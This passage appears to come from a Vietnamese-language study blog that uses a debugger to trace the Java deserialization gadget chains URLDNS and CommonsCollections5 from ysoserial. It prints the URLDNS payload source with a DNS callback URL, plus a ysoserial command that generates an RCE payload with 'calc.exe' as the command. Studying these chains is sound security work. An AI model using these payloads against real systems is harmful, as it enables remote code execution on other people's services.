<p>local variables: hiển thị tất cả các biến -&gt; để giúp cho quá trình debug dễ dàng.</p>
<p>Ngoài ra thì ở detail code cũng hiển thị các biến ở từng dòng:</p>
<p><img src="https://hackmd.io/_uploads/HyUpQ9630.png" alt="image"></p>
<p>có thể thấy ở đây:
<img src="https://hackmd.io/_uploads/BJ3gr5ThR.png" alt="image"></p>
<p>putVal sẽ nhận 5 đối số lúc nào key và value đều có giá trị là <code>http://e3t352l0.requestrepo.com</code> còn arg1 là hash(key)</p>
<ul>
<li>đến với mehthod hash ta có thể thấy nó xử lí như sau:</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="nf">hash</span><span class="o">(</span><span class="n">Object</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">h</span><span class="o">;</span>
        <span class="k">return</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">?</span> <span class="n">0</span> <span class="o">:</span> <span class="o">(</span><span class="n">h</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="na">hashCode</span><span class="o">())</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">16</span><span class="o">);</span>
    <span class="o">}</span>
</code></pre></div><p>nhận giá trị là một object key sau đó kiểm tra key == null hay không thì trả ra 0 nếu đúng còn nếu không thì nó lại trả ra <code>(h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code> và ở đây key.hashCode() được gọi đến -&gt;</p>
<p><img src="https://hackmd.io/_uploads/HkSpUqT2C.png" alt="image"></p>
<p>Có thể thấy nó như thế này:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">synchronized</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">hashCode</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">hashCode</span><span class="o">;</span>

        <span class="n">hashCode</span> <span class="o">=</span> <span class="n">handler</span><span class="o">.</span><span class="na">hashCode</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">hashCode</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">resetState</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">protocol</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">host</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">port</span> <span class="o">=</span> <span class="o">-</span><span class="n">1</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">file</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">authority</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">ref</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">hashCode</span> <span class="o">=</span> <span class="o">-</span><span class="n">1</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">handler</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">query</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">path</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">userInfo</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">tempState</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div><p><code>private int hashCode = -1;</code></p>
<p>Nó sẽ kiểm tra xem có giá trị hashCode nào được cache hay không -&gt; check nếu hashCode != 1 sẽ trả về luôn còn ngược lại thì gọi <code>handler.hashCode(this)</code> và để có thể chain được thì yêu cầu nó phải có giá trị bằng -1</p>
<p>Đây là lúc ta sử dụng java Reflection để set lại giá trị private này:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">URLDNS</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="o">{</span>

        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">url</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

                <span class="c1">//Avoid DNS resolution during payload creation
</span><span class="c1"></span>                <span class="c1">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
</span><span class="c1"></span>                <span class="n">URLStreamHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SilentURLStreamHandler</span><span class="o">();</span>

                <span class="n">HashMap</span> <span class="n">ht</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span> <span class="c1">// HashMap that will contain the URL
</span><span class="c1"></span>                <span class="n">URL</span> <span class="n">u</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">url</span><span class="o">,</span> <span class="n">handler</span><span class="o">);</span> <span class="c1">// URL to use as the Key
</span><span class="c1"></span>                <span class="n">ht</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span> <span class="c1">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
</span><span class="c1"></span>
                <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="s">&#34;hashCode&#34;</span><span class="o">,</span> <span class="o">-</span><span class="n">1</span><span class="o">);</span> <span class="c1">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
</span><span class="c1"></span>
                <span class="k">return</span> <span class="n">ht</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
                <span class="n">PayloadRunner</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">URLDNS</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="cm">/**
</span><span class="cm">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
</span><span class="cm">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
</span><span class="cm">         * using the serialized object.&lt;/p&gt;
</span><span class="cm">         *
</span><span class="cm">         * &lt;b&gt;Potential false negative:&lt;/b&gt;
</span><span class="cm">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
</span><span class="cm">         * second resolution.&lt;/p&gt;
</span><span class="cm">         */</span>
        <span class="kd">static</span> <span class="kd">class</span> <span class="nc">SilentURLStreamHandler</span> <span class="kd">extends</span> <span class="n">URLStreamHandler</span> <span class="o">{</span>

                <span class="kd">protected</span> <span class="n">URLConnection</span> <span class="nf">openConnection</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
                <span class="o">}</span>

                <span class="kd">protected</span> <span class="kd">synchronized</span> <span class="n">InetAddress</span> <span class="nf">getHostAddress</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
                <span class="o">}</span>
        <span class="o">}</span>
<span class="o">}</span>
</code></pre></div><p>Đây là mã chain trong yoserial-all.jar nó sẽ thực hiện điều này bằng cách khai báo một URL u <code>URL u = new URL(null, url, handler);</code> -&gt; khai báo một ht là hashMap <code>HashMap ht = new HashMap();</code> -&gt; put u vào trong ht -&gt; gọi đến <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1)</code> ở đây ta có thể thấy nó set lại giá trị của hashCode bằng -1 để có thể nhảy đến gadget <code>hashCode = handler.hashCode(this);</code></p>
<p><img src="https://hackmd.io/_uploads/HkIBoqT2A.png" alt="image"></p>
<p>Sau khi put URL obj vào ht, HashMap sẽ thay đổi giá trị của trường giá trị hashCode của URL thành giá trị mới khác -1 nên chương trình sẽ không nhảy vào đường &ldquo;bóng&rdquo; mà chúng ta yêu cầu -&gt; vì vậy ngay sau đó sẽ dùng <code>Field f1 = &lt;Some Class&gt;.getDeclaredField(&lt;Field Name&gt;);</code> đây <code>&lt;Some Class&gt;</code> chúng ta có thể là URL.class hoặc gián tiếp như <code>Class.forName(“java.net.URL”)</code> như trong bài java reflection đã được đề cập đến</p>
<p>Do trường hashCode được khai báo với dạng private cho nên ta không thể thao tác trực tiếp ngay với nó được mà phải <code>f1.setAccessible(true);</code></p>
<p>-&gt; sau đó thì ta đã có thể set giá trị cho nó mặc dù nó được khai báo private <code>f1.set(u, -1)</code></p>
<p>f1 là trường hashCode của class URL 1 LÀ object của class URL, -1 là giá trị cần set</p>
<p><img src="https://hackmd.io/_uploads/H1gOkjTnA.png" alt="image"></p>
<p>Tiếp theo sau đó:
<img src="https://hackmd.io/_uploads/HJC1Wiph0.png" alt="image"></p>
<p>handler được khai báo như trên là một obj từ class <code>URLStreamHandler</code> ! Đặc điểm của transient field này là khi serialize, nó không được serialize cùng object!</p>
<p>-&gt; đi vào tìm hashCode của <code>URLStreamHandler</code></p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">protected</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">h</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>

        <span class="c1">// Generate the protocol part.
</span><span class="c1"></span>        <span class="n">String</span> <span class="n">protocol</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getProtocol</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">protocol</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
            <span class="n">h</span> <span class="o">+=</span> <span class="n">protocol</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>

        <span class="c1">// Generate the host part.
</span><span class="c1"></span>        <span class="n">InetAddress</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">getHostAddress</span><span class="o">(</span><span class="n">u</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">addr</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">h</span> <span class="o">+=</span> <span class="n">addr</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">host</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getHost</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">host</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
                <span class="n">h</span> <span class="o">+=</span> <span class="n">host</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">hashCode</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="c1">// Generate the file part.
</span><span class="c1"></span>        <span class="n">String</span> <span class="n">file</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getFile</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">file</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
            <span class="n">h</span> <span class="o">+=</span> <span class="n">file</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>

        <span class="c1">// Generate the port part.
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">u</span><span class="o">.</span><span class="na">getPort</span><span class="o">()</span> <span class="o">==</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span>
            <span class="n">h</span> <span class="o">+=</span> <span class="n">getDefaultPort</span><span class="o">();</span>
        <span class="k">else</span>
            <span class="n">h</span> <span class="o">+=</span> <span class="n">u</span><span class="o">.</span><span class="na">getPort</span><span class="o">();</span>

        <span class="c1">// Generate the ref part.
</span><span class="c1"></span>        <span class="n">String</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getRef</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">ref</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
            <span class="n">h</span> <span class="o">+=</span> <span class="n">ref</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>

        <span class="k">return</span> <span class="n">h</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div><p><img src="https://hackmd.io/_uploads/rk1nMi620.png" alt="image"></p>
<p>Để ý <code>InetAddress addr = getHostAddress(u);</code> getHostAddress sẽ nhận url là host là key mà ta truyền vào</p>
<p><code>protected InetAddress getHostAddress(URL u) { return u.getHostAddress(); }</code></p>
<p><img src="https://hackmd.io/_uploads/ryPNNiThA.png" alt="image"></p>
<p><code>hostAddress = InetAddress.getByName(host);</code> sẽ gọi đến method <code>getByName</code> với arg là host</p>
<p><img src="https://hackmd.io/_uploads/rJn94iT30.png" alt="image"></p>
<p>và đây chính là sink của gadgetchain này mà chúng ta hướng đến thực hiện resolve dns với domain ta truyền vào.</p>
<h2 id="common-colection5">common colection5</h2>
<p><code>java -jar ysoserial-all.jar CommonsCollections5 &quot;calc.exe&quot; | base64 -w0</code></p>
<ul>
<li>ở gadget này ta vẫn rce được nhưng thông qua các chain ở lib khác</li>
</ul>
<p>/*
Gadget chain:
ObjectInputStream.readObject()
BadAttributeValueExpException.readObject()
TiedMapEntry.toString()
LazyMap.get()
ChainedTransformer.transform()
ConstantTransformer.transform()
InvokerTransformer.transform()
Method.invoke()
Class.getMethod()
InvokerTransformer.transform()
Method.invoke()
Runtime.getRuntime()
InvokerTransformer.transform()
Method.invoke()
Runtime.exec()</p>
<pre><code>Requires:
	commons-collections
</code></pre>
<p>*/</p>
<p>Có thể thấy ở đây đi từ BadAttributeValueExpException đến sink là Method.invoke -&gt; ta cùng debug để xem qua trình run của nó</p>
<p>Như anh tác giả tsug0d và anh Jang đã nói về chain này</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span> <span class="n">ois</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
        <span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">GetField</span> <span class="n">gf</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readFields</span><span class="o">();</span>
        <span class="n">Object</span> <span class="n">valObj</span> <span class="o">=</span> <span class="n">gf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;val&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">valObj</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">val</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">val</span><span class="o">=</span> <span class="n">valObj</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getSecurityManager</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span>
                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Long</span>
                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Integer</span>
                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Float</span>
                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Double</span>
                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Byte</span>
                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Short</span>
                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Boolean</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">val</span> <span class="o">=</span> <span class="n">valObj</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="c1">// the serialized object is from a version without JDK-8019292 fix
</span><span class="c1"></span>            <span class="n">val</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">identityHashCode</span><span class="o">(</span><span class="n">valObj</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;@&#34;</span> <span class="o">+</span> <span class="n">valObj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div><p>Nếu ta đặt break point tại <code>val = valObj.toString();</code> thì sẽ pop up calc lên luôn vậy tại sao lại xảy ra điều đó khi ta chưa chạy đến sink của gadget là Method.invoke để reflection -&gt; RCE.</p>
<p>-&gt; do đây là một tính năng của IntelliJ debugger:</p>
<p>-&gt; khi dừng lại 1 b* của trình debbugger thì ide sẽ cố gắng lấy tất cả giá trị của các biến trước khi đến b*  -&gt; nó sẽ nhận dữ liệu đầu vào dưới dang object và khả năng muốn chuyển thành string để người dùng có thể đọc -&gt; vì vậy nó đã ngầm invoke method toString -&gt; lúc này các chain ở đẳng sau sẽ tự động gadget vào luôn.</p>
<p>Do đó nên ta sẽ đi tìm nơi đặt b* khác để không bị pop up calc trước khi đến sink ta sẽ tìm b* ở class khác của gadget</p>
<p><img src="https://hackmd.io/_uploads/HyLa7wgpA.png" alt="image"></p>
<p>Trước tiên thì phân tích trước -&gt; method sẽ nhận ois là obj của ObjectInputStream</p>
<p>sau đó check điều kiện để vào if -&gt; gọi method toString();</p>
<p><img src="https://hackmd.io/_uploads/rJ5WyFxaR.png" alt="image"></p>
<p>có thể thấy valObj này khởi tạo từ TiedMapEntry -&gt; đi vào class và tìm đến toString:</p>
<p><img src="https://hackmd.io/_uploads/rkNC1Kg6C.png" alt="image"></p>
<p>ở đây sẽ trả về chuỗi là kết quả của 2 method</p>
<p><img src="https://hackmd.io/_uploads/ByGzeKlpC.png" alt="image"></p>
<p>nếu ta đặt b* tại toString thì vẫn dính invoke toString của IntelliJ và pop up calc đo đó nếu ta đặt b* trong 2 method trên sẽ bị -&gt; bây giờ ta sẽ tìm chain của nó</p>
<p>Tại</p>
<pre><code>    public Object getValue() {
        return this.map.get(this.key);
    }
</code></pre><p>-&gt; là method từ class LazyMap</p>
<p><img src="https://hackmd.io/_uploads/rJ_hbtepC.png" alt="image"></p>
<p>Khi đặt b* ở class này thì calc không bị pop up trước nữa -&gt; tiếp tục quan sát các biến local</p>
<p>Tại đây sẽ kiểm tra nếu chưa có key thì tiến hành gọi <code>Object value = this.factory.transform(key);</code> sau đó put kết quả trả về theo từng key</p>
<p><img src="https://hackmd.io/_uploads/SkrAmYxaA.png" alt="image"></p>
<p>thằng <code>iTransformers</code> là một array được khai báo trong class ChainedTransformer</p>
<p><img src="https://hackmd.io/_uploads/B17yBYgTA.png" alt="image"></p>
<p>Method transform ở đây:</p>
<p><img src="https://hackmd.io/_uploads/Sk3zHKxT0.png" alt="image"></p>
<p>nó sẽ thực hiện duyệt đến hết mảng iTransformers sau đó với mỗi giá trị class trong mảng tiếp tục gọi method transfrom đó với từng class trong mảng này</p>
<p><img src="https://hackmd.io/_uploads/HkNhHFxTA.png" alt="image"></p>
<p>Đối với payload common 5 sẽ có 5 phần tử -&gt; vòng lặp đầu tiên:</p>
<p><img src="https://hackmd.io/_uploads/S1b0ItxpC.png" alt="image"></p>
<p>method ở đây chỉ trả về <code>iConstant</code> tức là <img src="https://hackmd.io/_uploads/B1GbDFepC.png" alt="image"></p>
<p>Vậy ở đây không có method nào để lợi dụng</p>
<p>Lòng lặp thứ 2:</p>
<p><img src="https://hackmd.io/_uploads/ryCFdtxT0.png" alt="image"></p>
<p>class lúc này là getMethod</p>
<p><img src="https://hackmd.io/_uploads/r1i3_tgT0.png" alt="image"></p>
<p>input của ta lúc này chắc chắn khác null để ý:</p>
<pre><code> Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
</code></pre><p>khởi tạo một obj từ Class sau đó gán cho obj method từ Method giá trị getMethod -&gt; trả về method.invoke giá trị input của ta -&gt; Đây là chain cuối để lead to RCE</p>
<p><img src="https://hackmd.io/_uploads/rkx0ttx6C.png" alt="image"></p>
<p>input là class java.lang.Runtime cls lúc này là class java.lang.Class như được khởi tạo</p>
<p><img src="https://hackmd.io/_uploads/SkUEqYgaC.png" alt="image"></p>
<p>Có thể thấy điểm khác lạ ở đây thì input là class của java chứ không phải là do người dùng tạo -&gt; đối với cách dùng hợp lí thì input sẽ là của một class do người dùng định nghĩa</p>
<p>Ví dụ như: input là 1 object của class HashMap(). Khi thực thi đoạn code trên, input.getClass() sẽ tương tự như thực thi HashMap.getClass() và trả về class HashMap()</p>
<p>tiếp tục đoạn khởi tạo method từ Method gọi Class.getMethod(&ldquo;getMethod&rdquo;, …) và getMethod() này sẽ trả về method getMethod() của class Class trong java không phải người dùng tạo -&gt; cuối cùng thì ta invoke nó</p>
<h3 id="phân-tích-chi-tiết-debugger-phần-chain-lead-to-rce-tại-class-invokertransformer">Phân tích chi tiết debugger phần chain lead to RCE tại class InvokerTransformer</h3>
<p>Như đã nói ở trên thì tại class ChainedTransformer sẽ có 1 vòng for duyệt qua mảng</p>
<p><img src="https://hackmd.io/_uploads/H1a5SNWTC.png" alt="image"></p>
<p>ở đây chúng ta có thể thấy mảng này sẽ là mảng các obt tạo từ class tại Transformer.</p>
<pre><code> public Object transform(Object object) {
        for(int i = 0; i &lt; this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
</code></pre><p>tương tự ở phía trên ta có thấy method transfrom ở đây được gọi với tham số là Object object được truyền vào lúc này giá trị của object là &ldquo;foo&rdquo;</p>
<p><img src="https://hackmd.io/_uploads/BJpDLNZTC.png" alt="image"></p>
<p>Mảng iTransformers trong gadget này gồm có 5 phần tử như sau:</p>
<p><img src="https://hackmd.io/_uploads/HkfCUNb6C.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/r1IGOVbTR.png" alt="image"></p>
<ul>
<li>loop1: i = 0 ; object = &ldquo;foo&rdquo;; this.iTransformers[i] có key &ldquo;iConstant&rdquo; có giá trị là &ldquo;class java.lang.Runtime&rdquo;</li>
</ul>
<p>lúc này object được gán lại bằng <code>this.iTransformers[i].transform(object);</code></p>
<p>Với các giá trị ở trên thì this.iTransformers[i] là obj của class <code>ConstantTransformer</code> -&gt; nó gọi transform với tham số là input -&gt; lúc này là object ta đã truyền vào với giá trị ở trên
Method này chỉ đơn giản trả về giá trị của key iConstant là <code>&quot;class java.lang.Runtime&quot;</code></p>
<p>*loop2: i = 1; object lúc này có giá trị là <code>class java.lang.Runtime</code> được trả ra ở trên, lúc này this.iTransformers[i] là object với các key và value như sau:</p>
<p><img src="https://hackmd.io/_uploads/SJRjNS-60.png" alt="image"></p>
<p>Có thể quan sát được giá trị được ida liệt kê như dưới:</p>
<p><img src="https://hackmd.io/_uploads/HJXGSB-T0.png" alt="image"></p>
<p>Khi gọi method transform ở class <code>InvokerTransformer</code></p>
<p><img src="https://hackmd.io/_uploads/HJ4_HSZTR.png" alt="image"></p>
<p>Đối với method này nhận obj input là giá trị được nói ở trên và chắc chắn nó khác null nên sẽ vào khối lệnh try catch ở dưới</p>
<p>Lúc này một obj cls được khởi tạo theo class Class và được gán giá trị là input.getClass()</p>
<p>Đặt b* và giá trị lúc này của nó sẽ là:</p>
<p><img src="https://hackmd.io/_uploads/ByQDLHZ6C.png" alt="image"></p>
<p>Chạy qua b* ta có giá trị cls là:</p>
<p><img src="https://hackmd.io/_uploads/S1hcUB-a0.png" alt="image"></p>
<p>Tiếp tục khởi tạo một obj method từ class Method và gán giá trị là cls.getMethod với tham số <code>this.iMethodName, this.iParamTypes</code></p>
<p>Gía trị của chúng như ở dưới:</p>
<p><img src="https://hackmd.io/_uploads/HyOePrZpC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SyISDrWTC.png" alt="image"></p>
<p>Trong java thì tất cả các class đều là obj con của class Class</p>
<p>Do đó khi mà gọi getClass sẽ trả ra java.lang.class</p>
<p>Bình thường thì kiểu sẽ gọi:</p>
<pre><code>Runtime input = Runtime.getRuntime();
Class cls = input.getClass();
System.out.println(cls);  // java.lang.Runtime

</code></pre><p>Thêm một ví dụ nữa là:</p>
<pre><code>String input = &quot;l3mnt2010&quot;;
Class cls = input.getClass();
System.out.println(cls);  // java.lang.String

</code></pre><p>Vậy đối với trường hợp này có gì khác -&gt; input là một obj của Class chứ không phải object thông thường</p>
<p>Khi thực hiện gọi input.getClass sẽ trả về class Class():</p>
<p><img src="https://hackmd.io/_uploads/BkJ5yLWTC.png" alt="image"></p>
<p>Đến với <code>Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</code> ở đây class sẽ tưởng tự Class.getMethod</p>
<p>với 2 tham số</p>
<p><img src="https://hackmd.io/_uploads/B1dLlUWpC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BkFtlUba0.png" alt="image"></p>
<p>Tại đây method sẽ là class Method do ta đã dùng method getMethod với nameMethod được truyền vào từ class Class để nhận lại method getMethod như hình ta đã đề cập ở trên.</p>
<p>Tiếp theo sẽ trả về method.invoke(input, this.iArgs)</p>
<p><img src="https://hackmd.io/_uploads/ByvzmU-6A.png" alt="image"></p>
<p>iArgs lúc này là mảng có 1 phần tử có giá trị là chuỗi &ldquo;getRuntime&rdquo;</p>
<p>input thì vẫn là class java.lang.Runtime</p>
<p>tìm hiểu một chút về method invoke</p>
<p><img src="https://hackmd.io/_uploads/BkItmLW60.png" alt="image"></p>
<p>Nó có tác dụng là gọi(thực thi phương thức được truyền trong arg) với tham số là mảng chứa chuỗi &ldquo;getRuntime&rdquo;.</p>
<p>*loop3: với i = 2, giá trị object được gán lại với giá trị class:</p>
<p><img src="https://hackmd.io/_uploads/SkZA4U-aR.png" alt="image"></p>
<p>Có thể thấy kết quả giá trị trả về của invoke ở loop2 ở đây</p>
<p>Tiếp tục đi vào for lần này thì vẫn cùng class với loop2 mỗi tội khác arg thôi</p>
<p><img src="https://hackmd.io/_uploads/HJc8SIZpR.png" alt="image"></p>
<p>Đoạn này ở loop trước đã giải thích nhiều nên ta chỉ lướt nhanh.</p>
<p>Class cls sẽ có giá trị là class java.lang.reflect.Method -&gt; tiếp tục đến với Method methof sẽ gọi getMethod method name là invoke</p>
<p><img src="https://hackmd.io/_uploads/BJyMI8baC.png" alt="image">
giá trị method sẽ được trả ra là method invole của java.lang.reflect.Method.invoke</p>
<p>Đi xuống return sẽ gọi method này với tham số trống</p>
<p>*loop4: với i = 3, giá trị object được gán lại và gọi transform với name method exec:</p>
<p><img src="https://hackmd.io/_uploads/rkWsDUW6C.png" alt="image"></p>
<p>Method lúc này sẽ là exec:</p>
<p><img src="https://hackmd.io/_uploads/B16pwU-6A.png" alt="image"></p>
<p>Tiếp tục gọi invoke method này với tham số là calc.exe -&gt; kết quả là gọi Runtime của java -&gt; pop up calc.exe và trả về giá trị 1 process</p>
<p>*loop5: i = 4, giá trị obj được trả về và set ở trên</p>
<p><img src="https://hackmd.io/_uploads/S18hdUbpC.png" alt="image"></p>
<p>lúc này method transform vẫn tiếp tục được gọi lần này sẽ nhảy vào <code>ConstantTransformer</code> và lấy ra giá trị iContant như ở loop1 và giá trị này sẽ là 1 được trả ra -&gt; cuối cùng object được gán là 1</p>
<p><img src="https://hackmd.io/_uploads/HkJUYLZ60.png" alt="image"></p>
<p>Trở về <code>TiedMapEntry</code>:</p>
<p><img src="https://hackmd.io/_uploads/S1weiUWaA.png" alt="image"></p>
<p>getValue sẽ trả ra giá trị 1</p>
<p>toString trả ra chuỗi <code>foo=1</code></p>
<p>Quay lại với class <code>BadAttributeValueExpException</code></p>
<pre><code>val = valObj.toString();
</code></pre><p>val sẽ có giá trị là chuỗi ở trên và trả ra ngoài nhưng không phù hợp với Class được yêu cầu deserialize nên sẽ trả ra exception</p>
<p>Vậy là ta đã phân tích xong common colection 5, thank you</p>
<h2 id="common-clection-2">common clection 2</h2>
